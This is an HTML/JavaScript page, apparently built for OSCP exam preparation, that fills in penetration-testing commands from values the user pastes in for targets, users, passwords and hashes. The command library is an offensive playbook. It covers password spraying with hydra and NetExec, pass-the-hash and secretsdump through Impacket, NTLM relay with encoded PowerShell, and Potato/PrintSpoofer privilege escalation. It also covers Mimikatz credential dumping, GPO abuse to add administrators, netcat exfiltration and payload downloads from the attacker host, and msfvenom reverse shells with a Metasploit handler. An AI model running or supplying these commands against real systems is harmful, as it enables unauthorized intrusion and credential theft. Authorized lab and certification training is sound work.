<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>OSCP Cheatsheet</title>

  <style>
    :root {
      --bg: #0f1117;
      --panel: #171a21;
      --panel2: #20242e;
      --text: #e8e8e8;
      --muted: #a8b0bd;
      --border: #343a46;
      --accent: #78dce8;
      --danger: #ff6b6b;
      --ok: #7bd88f;
      --kali: #b8e986;
      --target: #ffd166;
    }

    * {
      box-sizing: border-box;
    }

    html {
      scroll-behavior: smooth;
    }

    body {
      margin: 0;
      padding: 28px 56px 28px 28px;
      font-family: Arial, Helvetica, sans-serif;
      background: var(--bg);
      color: var(--text);
    }

    h1 {
      margin-top: 0;
      margin-bottom: 6px;
    }

    h2 {
      margin-top: 24px;
      margin-bottom: 10px;
      border-bottom: 1px solid var(--border);
      padding-bottom: 6px;
    }

    h3 {
      margin: 0 0 10px;
    }

    .muted {
      color: var(--muted);
      font-size: 0.95rem;
    }

    .grid {
      display: grid;
      grid-template-columns: repeat(2, minmax(280px, 1fr));
      gap: 16px;
    }

    .card,
    .command-group {
      background: var(--panel);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 16px;
    }

    .command-group {
      margin-bottom: 16px;
      scroll-margin-top: 168px;
    }

    label {
      display: block;
      margin-bottom: 6px;
      color: var(--muted);
      font-size: 0.95rem;
    }

    textarea,
    input,
    select {
      width: 100%;
      background: var(--panel2);
      color: var(--text);
      border: 1px solid var(--border);
      border-radius: 6px;
      padding: 9px;
      font-size: 0.95rem;
    }

    textarea {
      min-height: 150px;
      resize: vertical;
      font-family: Consolas, Monaco, monospace;
    }

    input,
    select {
      min-height: 38px;
    }

    pre {
      margin: 0;
      white-space: pre-wrap;
      word-break: break-word;
      background: #090b10;
      color: #f3f3f3;
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 12px;
      font-family: Consolas, Monaco, monospace;
      font-size: 0.95rem;
      line-height: 1.45;
      flex: 1;
    }

    button {
      background: var(--panel2);
      color: var(--text);
      border: 1px solid var(--border);
      border-radius: 6px;
      padding: 8px 12px;
      cursor: pointer;
      white-space: nowrap;
    }

    button:hover {
      border-color: var(--accent);
    }

    .row {
      display: grid;
      grid-template-columns: repeat(4, minmax(160px, 1fr));
      gap: 12px;
    }

    .selected-row {
      display: grid;
      grid-template-columns: repeat(6, minmax(140px, 1fr));
      gap: 12px;
    }

    .sticky-selected {
      position: sticky;
      top: 0;
      z-index: 100;
      background: rgba(15, 17, 23, 0.96);
      backdrop-filter: blur(8px);
      border-bottom: 1px solid var(--border);
      margin: 22px -56px 18px -28px;
      padding: 14px 56px 16px 28px;
    }

    .sticky-selected h2 {
      margin-top: 0;
    }

    .combo {
      position: relative;
      display: flex;
      width: 100%;
    }

    .combo input {
      border-radius: 6px 0 0 6px;
      border-right: 0;
      min-width: 0;
    }

    .combo button {
      width: 38px;
      min-height: 38px;
      padding: 0;
      border-radius: 0 6px 6px 0;
      position: relative;
    }

    .combo button::before {
      content: "";
      position: absolute;
      left: 50%;
      top: 50%;
      transform: translate(-50%, -25%);
      width: 0;
      height: 0;
      border-left: 4px solid transparent;
      border-right: 4px solid transparent;
      border-top: 5px solid var(--muted);
      pointer-events: none;
    }

    .combo button:hover::before {
      border-top-color: var(--accent);
    }

    .combo-menu {
      display: none;
      position: absolute;
      top: calc(100% + 4px);
      left: 0;
      right: 0;
      z-index: 500;
      background: var(--panel2);
      border: 1px solid var(--border);
      border-radius: 6px;
      max-height: 240px;
      overflow-y: auto;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
    }

    .combo-menu.open {
      display: block;
    }

    .combo-option {
      padding: 8px 10px;
      cursor: pointer;
      font-size: 0.95rem;
    }

    .combo-option:hover {
      background: var(--panel);
      color: var(--accent);
    }

    .command-line {
      display: flex;
      align-items: stretch;
      gap: 10px;
      margin-bottom: 10px;
    }

    .command-line:last-child {
      margin-bottom: 0;
    }

    .command-prefix {
      width: 128px;
      min-width: 128px;
      padding-top: 9px;
      color: var(--muted);
      font-weight: bold;
      font-size: 0.92rem;
    }

    .command-prefix.kali {
      color: var(--kali);
    }

    .command-prefix.target {
      color: var(--target);
    }

    .copy-status {
      margin-left: 8px;
      color: var(--ok);
      font-size: 0.9rem;
    }

    .warning {
      color: var(--danger);
      font-size: 0.9rem;
      margin-top: 6px;
      min-height: 18px;
    }

    .copy-all {
      margin-top: 4px;
    }

    .jump-top {
      position: fixed;
      right: 22px;
      bottom: 22px;
      z-index: 300;
      border-color: var(--accent);
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.35);
      opacity: 0.92;
    }

    .jump-top:hover {
      opacity: 1;
    }

    .edge-nav-zone {
      position: fixed;
      top: var(--edge-nav-top, 86px);
      right: 0;
      width: 42px;
      height: calc(100vh - var(--edge-nav-top, 86px));
      z-index: 250;
    }

    .edge-nav-zone::after {
      content: "";
      position: fixed;
      top: var(--edge-nav-top, 86px);
      right: 0;
      width: 8px;
      height: calc(100vh - var(--edge-nav-top, 86px));
      border-left: 1px solid rgba(120, 220, 232, 0.22);
      pointer-events: none;
    }

    .edge-nav {
      position: fixed;
      top: var(--edge-nav-top, 86px);
      right: 0;
      width: 248px;
      max-height: calc(100vh - var(--edge-nav-top, 86px) - 46px);
      overflow-y: auto;
      padding: 12px;
      background: rgba(23, 26, 33, 0.98);
      border: 1px solid var(--border);
      border-right: 0;
      border-radius: 12px 0 0 12px;
      box-shadow: 0 8px 28px rgba(0, 0, 0, 0.42);
      transform: translateX(235px);
      transition: transform 150ms ease-in-out;
    }

    .edge-nav-zone:hover .edge-nav,
    .edge-nav:hover {
      transform: translateX(0);
    }

    .edge-nav::before {
      content: "≡";
      position: absolute;
      left: 7px;
      top: 8px;
      color: var(--accent);
      font-size: 1.2rem;
    }

    .edge-nav h4 {
      margin: 0 0 10px 24px;
      color: var(--accent);
    }

    .edge-nav a {
      display: block;
      color: var(--text);
      text-decoration: none;
      padding: 6px 8px;
      border-radius: 6px;
      font-size: 0.92rem;
    }

    .edge-nav a:hover {
      background: var(--panel2);
      color: var(--accent);
    }

    @media (max-width: 1200px) {
      .selected-row {
        grid-template-columns: repeat(3, minmax(160px, 1fr));
      }
    }

    @media (max-width: 850px) {
      body {
        padding: 16px 48px 16px 16px;
      }

      .grid,
      .row,
      .selected-row {
        grid-template-columns: 1fr;
      }

      .sticky-selected {
        margin-left: -16px;
        margin-right: -48px;
        padding-left: 16px;
        padding-right: 48px;
      }

      .command-line {
        flex-direction: column;
      }

      .command-prefix {
        width: auto;
        min-width: 0;
        padding-top: 0;
      }

      .command-line button {
        width: fit-content;
      }

      .edge-nav {
        width: 230px;
        transform: translateX(217px);
      }
    }
  </style>
</head>

<body id="top">
  <h1>OSCP Cheatsheet</h1>
  <p class="muted">
    Paste newline-separated values into the boxes, then select active values from the sticky dropdowns.
    Commands update automatically and can be copied line by line.
  </p>

  <div class="edge-nav-zone">
    <nav class="edge-nav" aria-label="Command navigation">
      <h4>Commands</h4>
      <div id="edgeNavLinks"></div>
    </nav>
  </div>

  <h2>Lists</h2>
  <div class="grid">
    <div class="card">
      <h3>Target Machines</h3>
      <textarea id="targetsInput" spellcheck="false" placeholder="127.0.0.1&#10;10.0.0.1"></textarea>
      <div class="warning" id="targetsWarning"></div>
    </div>

    <div class="card">
      <h3>Users</h3>
      <textarea id="usersInput" spellcheck="false" placeholder="administrator&#10;svc_backup"></textarea>
    </div>

    <div class="card">
      <h3>Passwords</h3>
      <textarea id="passwordsInput" spellcheck="false" placeholder="Password123!&#10;Spring2026!"></textarea>
    </div>

    <div class="card">
      <h3>Hashes</h3>
      <textarea id="hashesInput" spellcheck="false" placeholder="BA6E8E7514B5FEE748B3CB11A0337DEE"></textarea>
    </div>
  </div>

  <h2>Variables</h2>
  <div class="row">
    <div>
      <label for="domainInput">Domain</label>
      <input id="domainInput" value="domain.com" spellcheck="false" />
    </div>

    <div>
      <label for="kaliIpInput">Kali IP / LHOST / SRC_IP</label>
      <input id="kaliIpInput" value="192.168.45.219" spellcheck="false" />
    </div>

    <div>
      <label for="lportInput">LPORT</label>
      <input id="lportInput" value="4444" spellcheck="false" />
    </div>
  </div>

  <section class="sticky-selected">
    <h2>Selected Values</h2>
    <div class="selected-row">
      <div>
        <label for="targetSelect">Target</label>
        <select id="targetSelect"></select>
      </div>

      <div>
        <label for="userSelect">User</label>
        <select id="userSelect"></select>
      </div>

      <div>
        <label for="passwordSelect">Password</label>
        <select id="passwordSelect"></select>
      </div>

      <div>
        <label for="hashSelect">Hash</label>
        <select id="hashSelect"></select>
      </div>

      <div>
        <label for="serviceSelect">Service</label>
        <select id="serviceSelect"></select>
      </div>

      <div>
        <label for="filenameSelect">Filename</label>
        <div class="combo" id="filenameCombo">
          <input id="filenameSelect" value="shell.exe" spellcheck="false" autocomplete="off" />
          <button type="button" id="filenameDropdownButton" aria-label="Show filename options"></button>
          <div class="combo-menu" id="filenameMenu"></div>
        </div>
      </div>
    </div>
  </section>

  <h2>Generated Commands</h2>
  <main id="commandsContainer"></main>

  <button class="copy-all" onclick="copyAllCommands()">Copy All Commands</button>
  <span class="copy-status" id="allStatus"></span>

  <button class="jump-top" onclick="jumpToTop()">Top ↑</button>

  <script>
    /**************************************************************************
     * EASY EDIT AREA
     *
     * To add a new command section, add one object to COMMAND_SECTIONS:
     *
     * {
     *   id: "new-section",
     *   title: "New Section",
     *   nav: "New section",
     *   commands: [
     *     { prefix: "On Kali", className: "kali", template: "echo {target}" },
     *     { prefix: "On target", className: "target", template: "whoami" },
     *     { template: "plain command without prefix" }
     *   ]
     * }
     *
     * Supported template variables:
     * {target}, {last}, {targetNet}, {allLastOctets}, {allChallengeDirs},
     * {user}, {password}, {hash}, {domain}, {kaliIp}, {lport},
     * {service}, {filename}
     **************************************************************************/

    const SERVICES = ["SMB", "LDAP", "MSSQL", "WinRM", "WMI", "RDP", "SSH", "FTP"];

    const FILENAME_OPTIONS = [
      "shell.exe",
      "ligolo-agent.exe",
      "winPEASx64.exe",
      "SharpHound.ps1",
      "PrintSpoofer64.exe",
      "nc.exe",
      "mimikatz.exe",
      "mimikatz.log",
      "SharpEfsPotato.exe"
    ];

    const COMMAND_SECTIONS = [
      {
        id: "create-folders",
        title: "Create folder for each target",
        nav: "Create folders",
        commands: [
          { template: "mkdir -p {allChallengeDirs}" }
        ]
      },
      {
        id: "nmap",
        title: "Nmap",
        nav: "Nmap",
        commands: [
          { template: "sudo nmap -sV -sC -Pn -oA challenge/{last}/{last} {target}" },
          { prefix: "161 SNMP", template: "sudo nmap -sU -oA challenge/{last}/{last}_UDP {target}" }
        ]
      },
      {
        id: "gobuster",
        title: "gobuster",
        nav: "gobuster",
        commands: [
          { template: "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -o challenge/{last}/gobuster -x txt,pdf,config,conf,php,bak" }
        ]
      },
      {
        id: "hydra",
        title: "Hydra (SSH, RDP, FTP) (-s specify port)",
        nav: "hydra",
        commands: [
          { template: "hydra -L user.txt -P password.txt {service}://{target}" },
          { template: "hydra -L user.txt -p '{password}' {service}://{target}" },
          { template: "hydra -l '{user}' -P password.txt {service}://{target}" },
          { template: "hydra -l '{user}' -p '{password}' {service}://{target}" }
        ]
      },
      {
        id: "nxc-password",
        title: "NetExec (nxc) - password (-X for command execution)",
        nav: "NetExec password",
        commands: [
          { template: "nxc {service} {target} -u user.txt -p password.txt --continue-on-success" },
          { template: "nxc {service} {target} -u user.txt -p '{password}' --continue-on-success" },
          { template: "nxc {service} {target} -u '{user}' -p password.txt --continue-on-success" },
          { template: "nxc {service} {target} -u '{user}' -p '{password}' --continue-on-success" }
        ]
      },
      {
        id: "nxc-hash",
        title: "NetExec (nxc) - hash",
        nav: "NetExec hash",
        commands: [
          { template: "nxc {service} {target} -u user.txt -H hash.txt --continue-on-success" },
          { template: "nxc {service} {target} -u user.txt -H '{hash}' --continue-on-success" },
          { template: "nxc {service} {target} -u '{user}' -H hash.txt --continue-on-success" },
          { template: "nxc {service} {target} -u '{user}' -H '{hash}' --continue-on-success" }
        ]
      },
      {
        id: "rdp",
        title: "RDP",
        nav: "RDP",
        commands: [
          { template: "xfreerdp3 /cert:ignore /v:{target} /u:'{user}' /p:'{password}' /drive:share,/home/kali/share" }
        ]
      },
      {
        id: "winrm",
        title: "WinRM (5985 & 5986)",
        nav: "WinRM",
        commands: [
          { template: "evil-winrm -i {target} -u '{user}' -p '{password}'" },
          { template: "evil-winrm -i {target} -u '{user}' -p '{password}' -S -P 5986" },
          { template: "evil-winrm -i {target} -u '{user}' -H '{hash}'" }
        ]
      },
      {
        id: "printspoofer",
        title: "PrintSpoofer64 (SeImpersonatePrivilege)",
        nav: "PrintSpoofer64",
        commands: [
          { template: ".\\PrintSpoofer64.exe -i -c cmd" }
        ]
      },
      {
        id: "potato",
        title: "Potato (SeImpersonatePrivilege)",
        nav: "Potato",
        commands: [
          { template: ".\\SharpEfsPotato.exe -p {filename}" }
        ]
      },
      {
        id: "ligolo",
        title: "Ligolo",
        nav: "Ligolo",
        commands: [
          { prefix: "On Kali", className: "kali", template: "sudo ip tuntap add user kali mode tun ligolo" },
          { prefix: "", className: "kali", template: "sudo ip link set ligolo up" },
          { prefix: "", className: "kali", template: "./ligolo-proxy -selfcert -laddr 0.0.0.0:11601" },
          { prefix: "On target", className: "target", template: ".\\ligolo-agent -connect {kaliIp}:11601 -ignore-cert" },
          { prefix: "On Kali", className: "kali", template: "session" },
          { prefix: "", className: "kali", template: "ifconfig" },
          { prefix: "", className: "kali", template: "sudo ip route add {targetNet} dev ligolo" },
          { prefix: "", className: "kali", template: "start" }
        ]
      },
      {
        id: "password-cracking",
        title: "Password cracking",
        nav: "Password cracking",
        commands: [
          { prefix: "john", template: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt" },
          { prefix: "", template: "john --show hashes.txt" },
          { prefix: "hashcat", template: "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force" },
          { prefix: "", template: "hashcat --show -m 1000 hashes.txt" }
        ]
      },
      {
        id: "impacket",
        title: "Impacket",
        nav: "Impacket",
        commands: [
          { prefix: "Local admin & ADMIN$", template: "impacket-psexec -hashes :{hash} {user}@{target}" },
          { prefix: "", template: "impacket-wmiexec -hashes :{hash} {user}@{target}" },
          { template: "impacket-secretsdump -just-dc {domain}/{user}:'{password}'@{target}" },
          { template: "impacket-secretsdump -hashes :{hash} {domain}/{user}@{target}" },
          { prefix: "SMB NTLM relay", template: "impacket-ntlmrelayx --no-http-server -smb2support -t {target} -c \"powershell -enc JABjAGwAaQBlAG4AdA...\"" }
        ]
      },
      {
        id: "windows-enum",
        title: "Windows enumeration",
        nav: "Windows enumeration",
        commands: [
          { template: "net user /domain" },
          { template: "net user {user} /domain" },
          { template: "whoami /all" },
          { template: "systeminfo" },
          { template: "net localgroup administrators" },
          { prefix: "Password policy", template: "net accounts /domain" }
        ]
      },
      {
        id: "sharpgpoabuse",
        title: "SharpGPOAbuse",
        nav: "SharpGPOAbuse",
        commands: [
          { template: "./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount {user} --GPOName \"Default Domain Policy\"" },
          { template: "gpupdate /force" }
        ]
      },
      {
        id: "wmic",
        title: "WMIC (port 135 and local admin on target)",
        nav: "WMIC",
        commands: [
          { prefix: "Windows", className: "target", template: "wmic /node:{target} /user:{user} /password:'{password}' process call create \"powershell -nop -w hidden -e JABjAGwAaQ......gBOAGUAdAA\"" }
        ]
      },
      {
        id: "bloodhound",
        title: "Bloodhound (/etc/bhapi/bhapi.json)",
        nav: "Bloodhound",
        commands: [
          { prefix: "On Kali", className: "kali", template: "bloodhound-python -u '{user}' -p '{password}' -d {domain} -ns {target} -c All" },
          { prefix: "", className: "kali", template: "bloodhound-ce-python -u '{user}' -p '{password}' -d {domain} -ns {target} -c All" },
          { prefix: "On target", className: "target", template: "powershell -ep bypass" },
          { prefix: "", className: "target", template: "Import-Module .\\Sharphound.ps1" },
          { prefix: "", className: "target", template: ". .\\Sharphound.ps1" },
          { prefix: "", className: "target", template: "Invoke-BloodHound -CollectionMethod All -OutputDirectory ." },
          { prefix: "Pre-built queries", template: "All Domain Admins" },
          { prefix: "", template: "Shortest Paths to Domain Admins" },
          { prefix: "", template: "Shortest paths from Owned objects" },
          { prefix: "", template: "where Domain Users can RDP" },
          { prefix: "", template: "Computers where Domain Users are Local administrators" },
          { prefix: "", template: "All Kerberoastable user" }
        ]
      },
      {
        id: "mimikatz",
        title: "Mimikatz",
        nav: "Mimikatz",
        commands: [
          { template: ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"log mimikatz.log\" \"lsadump::sam\" \"sekurlsa::logonpasswords\" \"log\"" }
        ]
      },
      {
        id: "transfer-to-kali",
        title: "Transfer files to Kali",
        nav: "Transfer files to Kali",
        commands: [
          { prefix: "On Kali", className: "kali", template: "nc -lvnp 9001 > file.file" },
          { prefix: "On target", className: "target", template: "cmd.exe /c \".\\nc.exe {kaliIp} 9001 < file.file\"" },
          { prefix: "", className: "target", template: "python -m http.server 80" }
        ]
      },
      {
        id: "download-from-kali",
        title: "Downloading files from Kali",
        nav: "Downloading files",
        commands: [
          { prefix: "Linux", template: "wget http://{kaliIp}/{filename}" },
          { prefix: "Linux/PowerShell", template: "curl http://{kaliIp}/{filename} -o {filename}" },
          { prefix: "PowerShell", template: "iwr -uri http://{kaliIp}/{filename} -OutFile {filename}" },
          { prefix: "CMD", template: "certutil -urlcache -f http://{kaliIp}/{filename} {filename}" }
        ]
      },
      {
        id: "msfvenom",
        title: "msfvenom",
        nav: "msfvenom",
        commands: [
          { template: "msfvenom -p windows/x64/shell_reverse_tcp LPORT={lport} LHOST={kaliIp} -f exe -o shell.exe" }
        ]
      },
      {
        id: "multi-handler",
        title: "Multi-Handler",
        nav: "Multi-Handler",
        commands: [
          { template: "msfconsole" },
          { template: "use multi/handler" },
          { template: "set LHOST {kaliIp}" },
          { template: "set LPORT {lport}" },
          { template: "set ExitOnSession false" },
          { template: "run -j -z" },
          { template: "sessions" },
          { template: "sessions -i " },
          { template: "sessions -k " }
        ]
      }
    ];

    /**************************************************************************
     * APP LOGIC
     * You should not usually need to edit below this line.
     **************************************************************************/

    const stateKeys = [
      "targetsInput",
      "usersInput",
      "passwordsInput",
      "hashesInput",
      "domainInput",
      "kaliIpInput",
      "lportInput",
      "serviceSelect",
      "filenameSelect"
    ];

    function parseLines(text) {
      return text
        .split(/\r?\n/)
        .map(line => line.trim())
        .filter(Boolean);
    }

    function unique(values) {
      return [...new Set(values)];
    }

    function lastOctet(ip) {
      const parts = ip.trim().split(".");
      return parts.length === 4 ? parts[3] : ip.trim();
    }

    function cidr24Network(ip) {
      const parts = ip.trim().split(".");
      return parts.length === 4 ? `${parts[0]}.${parts[1]}.${parts[2]}.0/24` : `${ip}/24`;
    }

    function selectedOrFallback(id, fallback) {
      const value = document.getElementById(id).value.trim();
      return value || fallback;
    }

    function populateSelect(selectId, values, placeholder) {
      const select = document.getElementById(selectId);
      const previous = select.value;

      select.innerHTML = "";

      if (values.length === 0) {
        const option = document.createElement("option");
        option.value = "";
        option.textContent = placeholder;
        select.appendChild(option);
        return;
      }

      values.forEach(value => {
        const option = document.createElement("option");
        option.value = value;
        option.textContent = value;
        select.appendChild(option);
      });

      if (values.includes(previous)) {
        select.value = previous;
      }
    }

    function populateStaticSelect(selectId, values) {
      const select = document.getElementById(selectId);
      select.innerHTML = "";

      values.forEach(value => {
        const option = document.createElement("option");
        option.value = value;
        option.textContent = value;
        select.appendChild(option);
      });
    }

    function renderFilenameMenu() {
      const menu = document.getElementById("filenameMenu");
      menu.innerHTML = "";

      FILENAME_OPTIONS.forEach(filename => {
        const option = document.createElement("div");
        option.className = "combo-option";
        option.dataset.value = filename;
        option.textContent = filename;
        menu.appendChild(option);
      });
    }

    function renderNavigation() {
      const nav = document.getElementById("edgeNavLinks");
      nav.innerHTML = COMMAND_SECTIONS
        .map(section => `<a href="#${section.id}">${escapeHtml(section.nav || section.title)}</a>`)
        .join("");
    }

    function renderCommandSections() {
      const container = document.getElementById("commandsContainer");
      const html = COMMAND_SECTIONS.map((section, sectionIndex) => {
        const lines = section.commands.map((command, commandIndex) => {
          const commandId = commandIdFor(sectionIndex, commandIndex);
          const prefix = command.prefix !== undefined
            ? `<span class="command-prefix ${command.className || ""}">${escapeHtml(command.prefix)}</span>`
            : "";

          return `
            <div class="command-line">
              ${prefix}
              <button onclick="copyCommand('${commandId}', 'status-${section.id}')">Copy</button>
              <pre id="${commandId}"></pre>
            </div>`;
        }).join("");

        return `
          <div class="command-group" id="${section.id}">
            <h3>${escapeHtml(section.title)}</h3>
            ${lines}
            <span class="copy-status" id="status-${section.id}"></span>
          </div>`;
      }).join("");

      container.innerHTML = html;
    }

    function commandIdFor(sectionIndex, commandIndex) {
      return `cmd-${sectionIndex}-${commandIndex}`;
    }

    function getAllCommandIds() {
      return COMMAND_SECTIONS.flatMap((section, sectionIndex) =>
        section.commands.map((command, commandIndex) => commandIdFor(sectionIndex, commandIndex))
      );
    }

    function updateDropdowns() {
      const targets = unique(parseLines(document.getElementById("targetsInput").value));
      const users = unique(parseLines(document.getElementById("usersInput").value));
      const passwords = unique(parseLines(document.getElementById("passwordsInput").value));
      const hashes = unique(parseLines(document.getElementById("hashesInput").value));

      populateSelect("targetSelect", targets, "No targets pasted");
      populateSelect("userSelect", users, "No users pasted");
      populateSelect("passwordSelect", passwords, "No passwords pasted");
      populateSelect("hashSelect", hashes, "No hashes pasted");

      const invalidTargets = targets.filter(target => target.split(".").length !== 4);
      document.getElementById("targetsWarning").textContent =
        invalidTargets.length > 0
          ? "Warning: Some targets do not look like IPv4 addresses: " + invalidTargets.join(", ")
          : "";
    }

    function buildValues() {
      const targets = unique(parseLines(document.getElementById("targetsInput").value));
      const target = selectedOrFallback("targetSelect", "<target_ip>");
      const last = target !== "<target_ip>" ? lastOctet(target) : "<last_octet>";
      const challengeDirs = targets.map(ip => `challenge/${lastOctet(ip)}`);

      return {
        target,
        last,
        targetNet: target !== "<target_ip>" ? cidr24Network(target) : "<target_network>/24",
        allLastOctets: targets.map(lastOctet).join(" "),
        allChallengeDirs: challengeDirs.length > 0 ? challengeDirs.join(" ") : "<challenge_dirs>",
        user: selectedOrFallback("userSelect", "<user>"),
        password: selectedOrFallback("passwordSelect", "<password>"),
        hash: selectedOrFallback("hashSelect", "<hash>"),
        domain: selectedOrFallback("domainInput", "<domain>"),
        kaliIp: selectedOrFallback("kaliIpInput", "<kali_ip>"),
        lport: selectedOrFallback("lportInput", "<LPORT>"),
        service: selectedOrFallback("serviceSelect", "SMB").toLowerCase(),
        filename: selectedOrFallback("filenameSelect", "<filename>")
      };
    }

    function renderTemplate(template, values) {
      return template.replace(/\{([a-zA-Z0-9_]+)\}/g, (match, key) => {
        return values[key] !== undefined ? values[key] : match;
      });
    }

    function updateCommands() {
      updateDropdowns();

      const values = buildValues();

      COMMAND_SECTIONS.forEach((section, sectionIndex) => {
        section.commands.forEach((command, commandIndex) => {
          const commandId = commandIdFor(sectionIndex, commandIndex);
          document.getElementById(commandId).textContent = renderTemplate(command.template, values);
        });
      });

      saveState();
    }

    function setupFilenameCombo() {
      const combo = document.getElementById("filenameCombo");
      const input = document.getElementById("filenameSelect");
      const button = document.getElementById("filenameDropdownButton");
      const menu = document.getElementById("filenameMenu");

      button.addEventListener("click", event => {
        event.stopPropagation();
        menu.classList.toggle("open");
      });

      menu.querySelectorAll(".combo-option").forEach(option => {
        option.addEventListener("click", () => {
          input.value = option.dataset.value;
          menu.classList.remove("open");
          updateCommands();
        });
      });

      input.addEventListener("focus", () => {
        menu.classList.remove("open");
      });

      document.addEventListener("click", event => {
        if (!combo.contains(event.target)) {
          menu.classList.remove("open");
        }
      });
    }

    function fallbackCopy(text) {
      const textarea = document.createElement("textarea");
      textarea.value = text;
      textarea.style.position = "fixed";
      textarea.style.left = "-9999px";
      document.body.appendChild(textarea);
      textarea.focus();
      textarea.select();
      const successful = document.execCommand("copy");
      document.body.removeChild(textarea);
      return successful;
    }

    async function copyCommand(commandId, statusId) {
      const command = document.getElementById(commandId).textContent;
      const status = document.getElementById(statusId);

      try {
        if (navigator.clipboard && window.isSecureContext) {
          await navigator.clipboard.writeText(command);
        } else if (!fallbackCopy(command)) {
          throw new Error("Fallback copy failed");
        }

        status.textContent = "Copied";
        setTimeout(() => status.textContent = "", 1200);
      } catch (error) {
        status.textContent = "Copy failed";
        setTimeout(() => status.textContent = "", 1600);
      }
    }

    async function copyAllCommands() {
      const allCommands = getAllCommandIds()
        .map(id => document.getElementById(id).textContent)
        .join("\n\n");

      try {
        if (navigator.clipboard && window.isSecureContext) {
          await navigator.clipboard.writeText(allCommands);
        } else if (!fallbackCopy(allCommands)) {
          throw new Error("Fallback copy failed");
        }

        document.getElementById("allStatus").textContent = "Copied all";
        setTimeout(() => document.getElementById("allStatus").textContent = "", 1200);
      } catch (error) {
        document.getElementById("allStatus").textContent = "Copy failed";
        setTimeout(() => document.getElementById("allStatus").textContent = "", 1600);
      }
    }

    function saveState() {
      stateKeys.forEach(id => {
        const element = document.getElementById(id);
        localStorage.setItem("oscp_" + id, element.value);
      });
    }

    function loadState() {
      stateKeys.forEach(id => {
        const saved = localStorage.getItem("oscp_" + id);
        if (saved !== null) {
          const element = document.getElementById(id);
          const isSelect = element.tagName.toLowerCase() === "select";
          const optionExists = isSelect && Array.from(element.options).some(option => option.value === saved);

          if (!isSelect || optionExists) {
            element.value = saved;
          }
        }
      });
    }

    function bindEvents() {
      const watchedIds = [
        ...stateKeys,
        "targetSelect",
        "userSelect",
        "passwordSelect",
        "hashSelect"
      ];

      watchedIds.forEach(id => {
        document.getElementById(id).addEventListener("input", updateCommands);
        document.getElementById(id).addEventListener("change", updateCommands);
      });
    }

    function updateEdgeNavPosition() {
      const sticky = document.querySelector(".sticky-selected");
      if (!sticky) {
        document.documentElement.style.setProperty("--edge-nav-top", "86px");
        return;
      }

      const rect = sticky.getBoundingClientRect();
      const isFrozen = rect.top <= 1 && rect.bottom > 0;
      const top = isFrozen ? Math.ceil(rect.bottom + 8) : 86;
      document.documentElement.style.setProperty("--edge-nav-top", top + "px");
    }

    function jumpToTop() {
      window.scrollTo({ top: 0, behavior: "smooth" });
    }

    function escapeHtml(value) {
      return String(value)
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;")
        .replaceAll("'", "&#039;");
    }

    function init() {
      populateStaticSelect("serviceSelect", SERVICES);
      renderFilenameMenu();
      renderNavigation();
      renderCommandSections();
      loadState();
      bindEvents();
      setupFilenameCombo();
      updateEdgeNavPosition();
      window.addEventListener("scroll", updateEdgeNavPosition, { passive: true });
      window.addEventListener("resize", updateEdgeNavPosition);
      updateCommands();
    }

    init();
  </script>
</body>
</html>
